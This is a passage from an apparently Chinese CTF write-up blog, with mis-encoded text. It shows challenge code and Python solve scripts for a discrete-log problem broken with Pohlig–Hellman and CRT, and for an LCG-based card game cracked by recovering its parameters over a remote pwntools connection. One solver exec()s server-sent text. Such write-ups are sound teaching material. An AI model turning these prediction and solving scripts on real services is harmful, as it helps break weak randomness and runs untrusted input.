<span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;|||||\n\n&#x27;</span>)</span><br><span class="line">    a = <span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27;*&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">    b = <span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27;*&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="built_in">exec</span>(r.recvuntil(<span class="string">b&#x27;(&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">    delta = b**<span class="number">2</span>-<span class="number">4</span>*a</span><br><span class="line">    x = sympy.legendre_symbol(a,p)</span><br><span class="line">    x = x*(p-<span class="number">1</span> <span class="keyword">if</span> delta%p==<span class="number">0</span> <span class="keyword">else</span> -<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;x = <span class="subst">&#123;x&#125;</span>&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;answer: &#x27;</span>,<span class="built_in">str</span>(x).encode())</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Diligent-Liszt"><a href="#Diligent-Liszt" class="headerlink" title="Diligent_Liszt"></a>Diligent_Liszt</h3><blockquote><p><a href="https://en.wikipedia.org/wiki/Discrete_logarithm">https://en.wikipedia.org/wiki/Discrete_logarithm</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&quot;SYC&quot;</span>)</span><br><span class="line">nbits = <span class="number">512</span></span><br><span class="line">g = <span class="number">3</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_p_1</span>(<span class="params">digit</span>):</span><br><span class="line">    primes = []</span><br><span class="line">    pri = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(primes)&lt;<span class="number">100</span>):</span><br><span class="line">        pri = gp.next_prime(pri)</span><br><span class="line">        primes.append(<span class="built_in">int</span>(pri))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        count = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> count &lt; <span class="number">2</span>**digit:</span><br><span class="line">            count *= random.choice(primes)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(gp.is_prime(count)):</span><br><span class="line">            <span class="keyword">return</span> count</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p,q,r = [gen_p_1(nbits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;pqr&quot;</span>] </span><br><span class="line"></span><br><span class="line">n = p*q*r </span><br><span class="line">x = bytes_to_long(flag) </span><br><span class="line">y = gp.powmod(g,x,n) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(q))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(r))   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;y = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(y)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(x)) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421</span></span><br><span class="line"><span class="string">q = 1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651</span></span><br><span class="line"><span class="string">r = 132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637</span></span><br><span class="line"><span class="string">y = 5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>DLPï¼ŒPohligâ€“Hellmanç®—æ³•+CRTã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421</span></span><br><span class="line">q = <span class="number">1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651</span></span><br><span class="line">r = <span class="number">132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637</span></span><br><span class="line">y = <span class="number">5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266</span></span><br><span class="line"></span><br><span class="line">g = <span class="number">3</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">babystep_giantstep</span>(<span class="params">g, y, p, q=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> q <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        q = p - <span class="number">1</span></span><br><span class="line">    m = <span class="built_in">int</span>(q**<span class="number">0.5</span> + <span class="number">0.5</span>)</span><br><span class="line">    <span class="comment"># Baby step</span></span><br><span class="line">    table = &#123;&#125;</span><br><span class="line">    gr = <span class="number">1</span>  <span class="comment"># g^r</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        table[gr] = r</span><br><span class="line">        gr = (gr * g) % p</span><br><span class="line">    <span class="comment"># Giant step</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        gm = <span class="built_in">pow</span>(g, -m, p)  <span class="comment"># gm = g^&#123;-m&#125;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    ygqm = y                <span class="comment"># ygqm = y * g^&#123;-qm&#125;</span></span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> ygqm <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">return</span> q * m + table[ygqm]</span><br><span class="line">        ygqm = (ygqm * gm) % p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pohligâ€“Hellmanæ³•</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pohlig_hellman_DLP</span>(<span class="params">g, y, p</span>):</span><br><span class="line">    crt_moduli = []</span><br><span class="line">    crt_remain = []</span><br><span class="line">    <span class="keyword">for</span> q, _ <span class="keyword">in</span> factor(p-<span class="number">1</span>):</span><br><span class="line">        x = babystep_giantstep(<span class="built_in">pow</span>(g,(p-<span class="number">1</span>)//q,p), <span class="built_in">pow</span>(y,(p-<span class="number">1</span>)//q,p), p, q)</span><br><span class="line">        <span class="keyword">if</span> (x <span class="keyword">is</span> <span class="literal">None</span>) <span class="keyword">or</span> (x &lt;= <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        crt_moduli.append(q)</span><br><span class="line">        crt_remain.append(x)</span><br><span class="line">    x = crt(crt_remain, crt_moduli)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">xp = pohlig_hellman_DLP(g, y%p, p)</span><br><span class="line">xq = pohlig_hellman_DLP(g, y%q, q)</span><br><span class="line">xr = pohlig_hellman_DLP(g, y%r, r)</span><br><span class="line">x = crt([xp,xq,xr],[p-<span class="number">1</span>,q-<span class="number">1</span>,r-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;D1scr3te_L0g_W1th_Mult1pl3_pr1m35&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="card-game"><a href="#card-game" class="headerlink" title="card_game"></a>card_game</h3><blockquote><p>AL3XEIé€ç»™äº†ä½ è¿™ä¸ªæ¸¸æˆçš„å…³é”®æ•°æ®ï¼Œä½ èƒ½é¢„æµ‹æ¥ä¸‹æ¥è¦å‡ºçš„ç‰Œå— nc 59.110.20.54 4953</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> cards <span class="keyword">import</span> Heart, Spade, Club, Diamond</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_card</span>(<span class="params">num</span>):</span><br><span class="line">    x = (num&gt;&gt;<span class="number">5</span>)%<span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (Heart[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Heart&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (Spade[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Spade&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> (Diamond[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Diamond&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (Club[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Club&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GAME</span>():</span><br><span class="line">    banner = <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string"> ####    ##   #####  #####      ####    ##   #    # ###### </span></span><br><span class="line"><span class="string">#    #  #  #  #    # #    #    #    #  #  #  ##  ## #      </span></span><br><span class="line"><span class="string">#      #    # #    # #    #    #      #    # # ## # #####  </span></span><br><span class="line"><span class="string">#      ###### #####  #    #    #  ### ###### #    # #      </span></span><br><span class="line"><span class="string">#    # #    # #   #  #    #    #    # #    # #    # #      </span></span><br><span class="line"><span class="string"> ####  #    # #    # #####      ####  #    # #    # ######</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line"></span><br><span class="line">    meum = <span class="string">&#x27;&#x27;&#x27;option:</span></span><br><span class="line"><span class="string">    1: start game</span></span><br><span class="line"><span class="string">    2: get hint</span></span><br><span class="line"><span class="string">    3: exit</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(meum)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;input your option: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        your_input = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            n = getPrime(<span class="number">36</span>)</span><br><span class="line">            m = getPrime(<span class="number">16</span>)</span><br><span class="line">            c = getPrime(<span class="number">16</span>)</span><br><span class="line">            seed = getPrime(<span class="number">36</span>)</span><br><span class="line">            out = seed</span><br><span class="line">            <span class="built_in">round</span> = <span class="number">0</span></span><br><span class="line">            score = <span class="number">0</span></span><br><span class="line">            res = []</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="built_in">round</span> += <span class="number">1</span></span><br><span class="line">                res = []</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;round:<span class="subst">&#123;<span class="built_in">round</span>&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;score:<span class="subst">&#123;score&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">3</span>):</span><br><span class="line">                    out = (out*m+c)%n</span><br><span class="line">                    res.append(out)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">round</span> == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                        card, suit = choose_card(i)</span><br><span class="line">                        <span class="built_in">print</span>(card)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">round</span>==<span class="number">2</span> <span class="keyword">or</span> <span class="built_in">round</span>==<span class="number">3</span>:  <span class="comment">#gift</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                        card, suit = choose_card(i)</span><br><span class="line">                        <span class="built_in">print</span>(card)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;gift: <span class="subst">&#123;res&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cards = []</span><br><span class="line">                    suits = []</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">                        card, suit = choose_card(res[i])</span><br><span class="line">                        cards.append(card)</span><br><span class="line">                        suits.append(suit)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Give me your guess: (example: Heart_1 Club_2 Diamond_3)&quot;</span>)  </span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        g_1, g_2, g_3 = <span class="built_in">input</span>().split()</span><br><span class="line">                        g_1, g_2, g_3 = g_1.split(<span class="string">&#x27;_&#x27;</span>), g_2.split(<span class="string">&#x27;_&#x27;</span>), g_3.split(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">                    <span class="keyword">except</span> ValueError:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Please enter in the correct format.&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">if</span> (g_1[<span class="number">0</span>] == suits[<span class="number">0</span>] <span class="keyword">and</span> g_1[<span class="number">1</span>] == cards[<span class="number">0</span>][<span class="number">15</span>]) <span class="keyword">and</span> (g_2[<span class="number">0</span>] == suits[<span class="number">1</span>] <span class="keyword">and</span> g_2[<span class="number">1</span>] == cards[<span class="number">1</span>][<span class="number">15</span>]) <span class="keyword">and</span> (g_3[<span class="number">0</span>] == suits[<span class="number">2</span>] <span class="keyword">and</span> g_3[<span class="number">1</span>] == cards[<span class="number">2</span>][<span class="number">15</span>]):</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> cards:</span><br><span class="line">                            <span class="built_in">print</span>(i)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Congratulations! You matched the cards!&quot;</span>)</span><br><span class="line">                        score += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> cards:</span><br><span class="line">                            <span class="built_in">print</span>(i)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Try again!&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> score == <span class="number">50</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;The flag is your reward!&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Have you ever heard of LCG?&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    GAME()</span><br></pre></td></tr></table></figure></blockquote><p>ä»£ç é€»è¾‘æœ¬è´¨æ˜¯LCGï¼Œæœ‰ä¸ªå‘ç‚¹ï¼Œæ¯”å¯¹çš„æ—¶å€™ï¼Œ10æ˜¯0ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_increment</span>(<span class="params">states, modulus, multiplier</span>):</span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_multiplier</span>(<span class="params">states, modulus</span>):</span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_modulus</span>(<span class="params">states</span>):</span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_card</span>(<span class="params">num</span>):</span><br><span class="line">    x = (num&gt;&gt;<span class="number">5</span>)%<span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>, <span class="string">&#x27;Heart&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>, <span class="string">&#x27;Spade&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> (num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>, <span class="string">&#x27;Diamond&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>, <span class="string">&#x27;Club&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">4953</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">seq = []</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;gift: &#x27;</span>)</span><br><span class="line">seq += <span class="built_in">eval</span>(r.recvline())</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;gift: &#x27;</span>)</span><br><span class="line">seq += <span class="built_in">eval</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(seq)</span><br><span class="line"></span><br><span class="line">n, m, c = crack_unknown_modulus(seq)</span><br><span class="line"><span class="built_in">print</span>((n,m,c))</span><br><span class="line"></span><br><span class="line">out = seq[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k 